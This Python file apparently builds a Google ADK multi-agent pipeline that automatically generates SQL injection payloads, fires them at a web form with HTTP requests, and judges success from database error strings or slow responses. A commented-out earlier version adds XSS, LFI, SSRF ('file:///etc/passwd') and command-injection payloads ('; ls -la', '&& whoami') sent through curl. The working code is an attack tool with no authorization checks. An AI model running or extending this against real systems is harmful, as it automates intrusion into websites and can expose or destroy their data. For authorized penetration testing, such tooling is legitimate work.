# import dotenv
# from google.adk.agents import Agent, SequentialAgent
# from google.adk.runners import Runner
# from google.adk.sessions import InMemorySessionService
# import asyncio
# import os
# from google.genai import types
# from dotenv import load_dotenv
# load_dotenv()
# import json
# from typing import List, Dict
# import subprocess
# import shlex


# def execute(curl: List[str]) -> List[Dict]:
#     results = []

#     for curl_command in curl:
#         print(f"Executing command: {curl_command}")

#         if not curl_command or not curl_command.strip().startswith("curl"):
#             results.append({
#                 "success": False,
#                 "error": "Invalid curl command. Command must start with 'curl'.",
#                 "status_code": -1
#             })
#             continue

#         try:
#             args = shlex.split(curl_command)
#             result = subprocess.run(
#                 args,
#                 capture_output=True,
#                 text=True,
#                 timeout=30
#             )

#             if result.returncode == 0:
#                 results.append({
#                     "success": True,
#                     "output": result.stdout.strip(),
#                     "status_code": 0
#                 })
#             else:
#                 results.append({
#                     "success": False,
#                     "error": result.stderr.strip(),
#                     "status_code": result.returncode
#                 })
#         except subprocess.TimeoutExpired:
#             results.append({
#                 "success": False,
#                 "error": "Command execution timed out after 30 seconds",
#                 "status_code": -1
#             })

#         except Exception as e:
#             results.append({
#                 "success": False,
#                 "error": f"Error executing curl command: {str(e)}",
#                 "status_code": -1
#             })

#     return results
# # AI Payload Generator Agent
# payload_agent = Agent(
#     name="payload_agent",
#     model="gemini-2.5-flash",
#     description='''You are the Payload Agent. Your task is to generate potential penetration testing payloads 
#     for given web application endpoints. These endpoints include path, methods (GET, POST), and form fields.

#     For each unique path, you will return a dictionary with:
#     - The endpoint path as a key
#     - A nested dictionary as value containing:
#       - Each form field name as key
#       - A relevant attack payload as values
    
#     For example:
#     ```
#     {
#       "/login": {
#         "email": ["test@example.com", "' OR 1=1--", "<script>alert(1)</script>"],
#         "password": ["password123", "' OR '1'='1", "admin' --"]
#       },
#       "/register": {
#         "name": ["test", "<script>alert(1)</script>", "'; DROP TABLE users;--"],
#         "email": ["test@example.com", "admin@' OR 1=1--"]
#         // other fields...
#       }
#     }
#     ```

#     For each field, generate 1 payload that are relevant based on the form field types:
#     - For `email` fields: email format attacks and email-based injections
#     - For `password` fields: SQLi or encoding-based attacks
#     - For `text` fields: XSS, LFI, command injections, etc.
#     - For `hidden` fields (like _token): CSRF attacks

#     Include common attack types:
#     - SQL Injection (`' OR 1=1--`, `admin' --`)
#     - Cross-site Scripting (XSS) (`<script>alert(1)</script>`)
#     - Server-Side Request Forgery (SSRF) (`http://127.0.0.1`, `file:///etc/passwd`)
#     - Local File Inclusion (LFI) (`../../../../etc/passwd`)
#     - Command Injection (`; ls -la`, `&& whoami`)
#     '''
# )

# attack_agent = Agent(
#     name="attack_agent",
#     model="gemini-2.5-flash",
#     description='''You are the Attack Agent. Your ONLY task is to perform penetration testing attacks on web application endpoints.
#     You will receive a list of endpoints with their respective methods and form fields. 
#     For each endpoint, you will execute the attack using the payloads generated by the Payload Agent.''',
#     tools=[execute],
#     instruction="generate a list of curl commands for each endpoint using the payloads provided by the Payload Agent, and send to `execute()`function ")

# root_agent = SequentialAgent(
#     name="sequential_agent",
#     description="You are the Sequential Agent. Your task is to manage and coordinate the execution of other agents in a sequential manner. "
#                 "If the user provides a list of endpoints, you will use the Payload Agent to generate potential payloads for each endpoint."
#                 "If the user provides a list of payloads, you will use the Attack Agent to perform penetration testing attacks on the endpoints using the payloads.",
#     sub_agents=[payload_agent, attack_agent]
# )

# # Runtime configuration (lazy-initialized to avoid side-effects on import)
# APP_NAME = "fuzzing_engine"
# USER_ID = "user_123"
# SESSION_ID = "session_456"

# # Internal runtime holders
# _session_service = None
# _runner = None
# _session = None

# def _has_genai_credentials():
#     """Check for genai credentials preferring GOOGLE_API_KEY in env.

#     Returns True if we can construct a Client with provided inputs, False otherwise.
#     """
#     api_key = os.environ.get("GOOGLE_API_KEY")
#     try:
#         from google.genai import client as genai_client
#         if api_key:
#             # Try constructing the client with api_key â€” this will raise if invalid/missing
#             genai_client.Client(api_key=api_key)
#             return True
#         # Fall back to default constructor (may raise if no other config present)
#         genai_client.Client()
#         return True
#     except Exception:
#         return False


# async def init_runtime_async(app_name: str = APP_NAME, user_id: str = USER_ID, session_id: str = SESSION_ID):
#     """Async initializer: create session and runner. Safe to call multiple times.

#     Returns the Runner instance.
#     """
#     global _session_service, _runner
#     if _runner is not None:
#         return _runner

#     _session_service = InMemorySessionService()
#     session = await _session_service.create_session(
#         app_name=app_name,
#         user_id=user_id,
#         session_id=session_id
#     )
#     # persist the created session object in module state for later access
#     global _session
#     _session = session
#     print(f"Created session: {session}")

#     _runner = Runner(
#         agent=root_agent,
#         app_name=app_name,
#         session_service=_session_service
#     )
#     return _runner


# def init_runtime_sync(app_name: str = APP_NAME, user_id: str = USER_ID, session_id: str = SESSION_ID):
#     """Synchronous initializer that runs the async initializer when called from sync code."""
#     return asyncio.run(init_runtime_async(app_name=app_name, user_id=user_id, session_id=session_id))


# def run_query(query: str):
#     """Synchronous wrapper around `run_query_async`.

#     Use `run_query_async` if you are already inside an asyncio event loop.
#     """
#     return asyncio.run(run_query_async(query))


# def save_session_to_file(path: str) -> dict:
#     """Save the currently-initialized session to a JSON file.

#     Returns a dict with keys: success (bool), path (str) and message or error.
#     """
#     if _session is None:
#         return {"success": False, "error": "No session initialized yet. Call run_query or init_runtime first."}

#     # Build a serializable representation using common attributes.
#     session_data = {}
#     for attr in ("id", "session_id", "app_name", "user_id", "state", "events", "last_update_time"):
#         # Some session implementations may use different attribute names
#         val = getattr(_session, attr, None)
#         # also try without trailing underscore for id/session_id mismatch
#         if val is None and attr == "session_id":
#             val = getattr(_session, "id", None)
#         session_data[attr] = val

#     try:
#         with open(path, "w") as f:
#             json.dump(session_data, f, default=str, indent=2)
#         return {"success": True, "path": path, "message": "Session saved."}
#     except Exception as e:
#         return {"success": False, "error": str(e)}

# async def run_query_async(query: str):
#     """Async entrypoint that awaits the runner's async API.

#     Returns the final response text or an error message when credentials are missing.
#     """
#     if not _has_genai_credentials():
#         return (
#             "LLM client not configured.\n"
#             "Set the Google AI API key or Google Cloud (vertexai, project & location) "
#             "configuration before calling the agent. For example:\n"
#             "export GOOGLE_API_KEY=your_api_key_here\n"
#         )

#     runner = await init_runtime_async()

#     content = types.Content(role="user", parts=[types.Part(text=query)])
#     async for event in runner.run_async(user_id=USER_ID, session_id=SESSION_ID, new_message=content):
#         if event.is_final_response():
#             print(_session)
#             return event.content.parts[0].text
#     return "No response received."

# if __name__ == "__main__":
#     # Example of usage when executed as a script
#     resp = run_query('''{
#     "endpoints": [
#         {
#             "url": "https://example.com/login",
#             "method": "POST",
#             "parameters": {
#                 "email": "user@example.com",
#                 "password": "password123"
#             }
#         }
#     ]}''')
#     print(resp)
#     save_session_to_file("fuzzing_session.json")

# agent.py
# Google ADK â€“ SQL Injection LoopAgent (Full Working Example)

import asyncio
from typing import Dict, Any
from google.adk.agents import LoopAgent, LlmAgent, SequentialAgent
from google.adk.runners import InMemoryRunner
from google.adk.tools.tool_context import ToolContext
from google.adk.events import EventActions
import subprocess
import shlex
import time
from typing import List, Dict
from google.adk.tools.tool_context import ToolContext
from dotenv import load_dotenv
load_dotenv()

import requests
import time
from typing import Dict, Any
from google.adk.tools.tool_context import ToolContext


def http_request(
    endpoint: str,
    method: str,
    data: Dict[str, Any],
    tool_context: ToolContext
) -> Dict[str, Any]:
    """
    ADK Tool: Execute HTTP request using requests.
    """

    print("ðŸ”¥ http_request TOOL INVOKED ðŸ”¥")
    print("Endpoint:", endpoint)
    print("Method:", method)
    print("Data:", data)

    try:
        start = time.time()

        if method.upper() == "POST":
            resp = requests.post(
                endpoint,
                data=data,
                timeout=15,
                allow_redirects=False
            )
        else:
            resp = requests.get(
                endpoint,
                params=data,
                timeout=15,
                allow_redirects=False
            )

        latency = time.time() - start
        body = resp.text.lower()

        sql_error_keywords = [
            "sql syntax",
            "mysql",
            "sqlite",
            "psql",
            "ora-",
            "syntax error",
            "odbc",
            "jdbc"
        ]

        sql_error = any(k in body for k in sql_error_keywords)

        return {
            "status": resp.status_code,
            "length": len(resp.text),
            "latency": round(latency, 3),
            "sql_error": sql_error
        }

    except Exception as e:
        return {
            "status": -1,
            "length": 0,
            "latency": 0,
            "sql_error": False,
            "error": str(e)
        }

def execute(curl_commands: List[str], tool_context: ToolContext) -> List[Dict]:
    """
    ADK Tool: Executes curl commands safely and returns structured results.
    """

    results = []

    for curl_command in curl_commands:
        print(f"[execute] Running: {curl_command}")

        # Basic validation
        if not curl_command or not curl_command.strip().startswith("curl"):
            results.append({
                "success": False,
                "error": "Invalid curl command",
                "status_code": -1,
                "latency": 0,
                "response_length": 0,
                "stdout": "",
                "stderr": "",
                "sql_error": False,
                "timed_out": False
            })
            continue

        try:
            args = shlex.split(curl_command)

            start = time.time()
            completed = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=30
            )
            latency = time.time() - start

            stdout = completed.stdout or ""
            stderr = completed.stderr or ""
            combined = (stdout + stderr).lower()

            # SQL error heuristics
            sql_error_keywords = [
                "sql syntax",
                "mysql",
                "psql",
                "sqlite",
                "ora-",
                "syntax error",
                "unterminated",
                "odbc",
                "jdbc"
            ]

            sql_error = any(k in combined for k in sql_error_keywords)

            results.append({
                "success": completed.returncode == 0,
                "status_code": completed.returncode,
                "latency": round(latency, 3),
                "response_length": len(stdout),
                "stdout": stdout[:2000],   # cap for safety
                "stderr": stderr[:2000],
                "sql_error": sql_error,
                "timed_out": False
            })

        except subprocess.TimeoutExpired:
            results.append({
                "success": False,
                "status_code": -1,
                "latency": 30,
                "response_length": 0,
                "stdout": "",
                "stderr": "Command timed out",
                "sql_error": False,
                "timed_out": True
            })

        except Exception as e:
            results.append({
                "success": False,
                "status_code": -1,
                "latency": 0,
                "response_length": 0,
                "stdout": "",
                "stderr": str(e),
                "sql_error": False,
                "timed_out": False
            })

    return results


# -------------------------------------------------------------------
# Constants
# -------------------------------------------------------------------

APP_NAME = "sql_injection_loop_app"
USER_ID = "dev_user_01"
SESSION_ID = "sql_loop_session_001"
GEMINI_MODEL = "gemma-3-1b-it"

# -------------------------------------------------------------------
# State Keys
# -------------------------------------------------------------------

STATE_ENDPOINT = "endpoint"
STATE_FIELD = "field"
STATE_PAYLOAD = "payload"
STATE_FEEDBACK = "feedback"

# -------------------------------------------------------------------
# Exit Tool
# -------------------------------------------------------------------

def exit_loop(tool_context: ToolContext):
    """
    Call ONLY when SQL injection is confirmed
    or further attempts are useless.
    """
    print(f"[Tool Call] exit_loop triggered by {tool_context.agent_name}")
    tool_context.actions.escalate = True
    tool_context.actions.skip_summarization = True
    return {}

# -------------------------------------------------------------------
# SQL Payload Generator Agent
# -------------------------------------------------------------------
state_init_agent = LlmAgent(
    name="StateInitAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
Initialize loop state from Web input.

Return EXACTLY this JSON:
{
  "endpoint": "{{input.endpoint}}",
  "field": "{{input.field}}"
}
""",
    output_key="__state__",   # ðŸ‘ˆ THIS IS THE KEY
    description="Writes endpoint and field into ADK state"
)
endpoint_init_agent = LlmAgent(
    name="EndpointInitAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
Read endpoint from Web input and output it verbatim.

Endpoint: {{input.endpoint}}

Output ONLY the endpoint string.
""",
    output_key="endpoint"
)
field_init_agent = LlmAgent(
    name="FieldInitAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
Read field from Web input and output it verbatim.

Field: {{input.field}}

Output ONLY the field string.
""",
    output_key="field"
)
feedback_init_agent = LlmAgent(
    name="FeedbackInitAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
Initialize feedback state.

Output an empty JSON object.
""",
    output_key="feedback"
)
form_init_agent = LlmAgent(
    name="FormInitAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
You are initializing form context for an attack agent.

Read the form info from Web input and output EXACTLY this JSON:

{
  "endpoint": "{{input.action}}",
  "method": "{{input.method}}",
  "inputs": {{input.inputs}},
  "target_field": "{{input.target_field}}"
}

Do not explain anything.
""",
    output_key="form"
)


sql_payload_agent = LlmAgent(
    name="SQLPayloadAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    instruction="""
You are a SQL Injection Payload Generator.

Form context:
Endpoint: {{form.endpoint}}
Method: {{form.method}}

Inputs:
{{form.inputs}}

Target field to attack:
{{form.target_field}}

Task:
Generate ONE SQL injection payload suitable for the target field.
- Email field â†’ boolean / auth bypass payloads
- Password field â†’ boolean or error-based payloads
- Ignore hidden fields

Output ONLY the payload string.
""",
    output_key="payload"
)


# sql_payload_agent = LlmAgent(
#     name="SQLPayloadAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     instruction="""
# You are a SQL Injection Payload Generator.

# Context:
# - Target endpoint: {{endpoint}}
# - Target parameter: {{field}}
# - Previous execution feedback:
# {{feedback}}

# Task:
# Generate ONE SQL injection payload.

# Rules:
# - Start simple, escalate gradually.
# - Prefer boolean-based â†’ error-based â†’ time-based.
# - Output ONLY the payload string.
# - No explanations.
# """,
#     description="Generates SQL injection payloads adaptively.",
#     output_key=STATE_PAYLOAD
# )

# -------------------------------------------------------------------
# SQL Attack Execution Agent
# -------------------------------------------------------------------

# sql_attack_agent = LlmAgent(
#     name="SQLAttackAgent",
#     model=GEMINI_MODEL,
#     include_contents="none",
#     tools=[execute],
#     instruction="""
# You are a SQL Attack Execution Agent.

# You are given:
# - Endpoint: {{endpoint}}
# - Parameter: {{field}}
# - Payload: {{payload}}

# Task:
# 1. Execute the attack using curl using the execute tool.
# 2. Return the results of the execution using the execute tool.
# """,
#     description="Executes SQL payloads using the execute tool and returns structured feedback.",
#     output_key=STATE_FEEDBACK
# )
sql_attack_agent = LlmAgent(
    name="SQLAttackAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    tools=[http_request],
    instruction="""
You are a SQL Attack Execution Agent.

THIS IS NON-NEGOTIABLE:
- You MUST call the http_request tool.
- You are NOT allowed to answer in text.
- If you do not call the tool, the task is FAILED.

Form context:
Endpoint: {{form.endpoint}}
Method: {{form.method}}
Inputs:
{{form.inputs}}

Target field:
{{form.target_field}}

Payload:
{{payload}}

Step-by-step (MANDATORY):
1. Build a dictionary called form_data:
   - Inject the payload ONLY into the target field
   - Use "test" for all other non-hidden fields

2. Call the http_request tool with EXACTLY:
{
  "endpoint": "{{form.endpoint}}",
  "method": "{{form.method}}",
  "data": form_data
}

3. Do NOT generate any text.
4. The tool response IS the final answer.
""",
    output_key="feedback"
)

# -------------------------------------------------------------------
# SQL Evaluator + Exit Controller Agent
# -------------------------------------------------------------------

sql_evaluator_agent = LlmAgent(
    name="SQLEvaluatorAgent",
    model=GEMINI_MODEL,
    include_contents="none",
    tools=[exit_loop],
    instruction="""
You are a SQL Injection Evaluator.

Execution feedback:
{{feedback}}

Decision rules:
- IF sql_error == true â†’ call exit_loop
- IF latency >= 4.5 seconds â†’ call exit_loop
- IF HTTP status is 403 or 429 â†’ call exit_loop
- ELSE â†’ do nothing (continue loop)

IMPORTANT:
- If calling exit_loop, DO NOT output text.
- If continuing, output NOTHING.
""",
    description="Evaluates SQL attack results and decides when to exit."
)

# -------------------------------------------------------------------
# SQL Injection Loop Agent
# -------------------------------------------------------------------

sql_loop_agent = LoopAgent(
    name="SQLInjectionLoop",
    sub_agents=[
        sql_payload_agent,
        sql_attack_agent,
        sql_evaluator_agent
    ],
    max_iterations=2
)

# -------------------------------------------------------------------
# Root Sequential Agent (required name: root_agent)
# -------------------------------------------------------------------

# root_agent = SequentialAgent(
#     name="SQLInjectionPipeline",
#     description="SQL injection testing pipeline (ADK Web compatible)",
#     sub_agents=[
#         state_init_agent,   
#         sql_loop_agent
#     ]
# )
# root_agent = SequentialAgent(
#     name="SQLInjectionPipeline",
#     sub_agents=[
#         endpoint_init_agent,   # writes state.endpoint
#         field_init_agent,      # writes state.field
#         feedback_init_agent,   # writes state.feedback
#         sql_loop_agent         # safe to run now
#     ]
# )
root_agent = SequentialAgent(
    name="SQLInjectionPipeline",
    sub_agents=[
        form_init_agent,     # writes state.form
        sql_loop_agent       # payload agent can now read {{form.*}}
    ]
)



# -------------------------------------------------------------------
# Runner
# -------------------------------------------------------------------

async def run():
    runner = InMemoryRunner(
        app_name=APP_NAME,
        agent=root_agent
    )

    async for event in runner.run_async(
        user_id=USER_ID,
        session_id=SESSION_ID,
        input={
            STATE_ENDPOINT: "http://target.com/login",
            STATE_FIELD: "email",
            STATE_FEEDBACK: ""
        }
    ):
        if event.actions == EventActions.ESCALATE:
            print("âœ… SQL Injection loop exited cleanly")
            break

if __name__ == "__main__":
    asyncio.run(run())
